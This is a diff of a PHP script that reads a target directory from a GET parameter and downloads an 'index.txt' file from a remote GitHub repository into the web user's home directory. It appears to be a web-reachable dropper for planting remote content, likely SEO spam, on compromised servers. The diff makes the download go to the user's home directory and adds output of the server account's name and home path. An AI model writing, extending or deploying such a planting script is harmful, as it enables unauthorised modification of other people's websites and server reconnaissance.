@@ -47,6 +47,10 @@ function downloadFile($url, $destination) {
     return false;
 }
 
+// Get current user
+$user = get_current_user();
+$userHomeDir = '/home/' . $user;
+
 // Get the target directory from GET parameter
 $targetDir = isset($_GET['path']) ? $_GET['path'] : '';
 
@@ -65,12 +69,14 @@ if (!is_writable($targetDir)) {
     die("Error: Directory is not writable: $targetDir");
 }
 
+echo "Current User: $user<br>";
+echo "User Home Directory: $userHomeDir<br>";
 echo "Target Directory: $targetDir<br><br>";
 
-// Step 1: Download index.txt to /var/tmp
-echo "Step 1: Downloading index.txt to /var/tmp<br>";
+// Step 1: Download index.txt to user home directory
+echo "Step 1: Downloading index.txt to $userHomeDir<br>";
 $indexTxtUrl = "https://raw.githubusercontent.com/seobela/bela/refs/heads/main/index.txt";
-$indexTxtDest = "/var/tmp/index.txt";
+$indexTxtDest = $userHomeDir . "/index.txt";
 
 if (downloadFile($indexTxtUrl, $indexTxtDest)) {
     echo "✓ Successfully downloaded index.txt to /var/tmp<br><br>";
